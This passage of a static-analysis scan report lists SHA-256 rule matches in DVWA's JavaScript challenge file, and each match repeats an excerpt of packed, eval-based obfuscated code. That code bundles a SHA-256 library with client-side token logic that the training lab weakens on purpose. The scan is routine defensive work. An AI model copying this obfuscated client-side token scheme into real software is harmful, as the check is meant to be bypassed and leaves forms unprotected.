20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7793,
        "endLocationLine": 1,
        "endLocationColumn": 7797
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7855,
        "endLocationLine": 1,
        "endLocationColumn": 7859
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
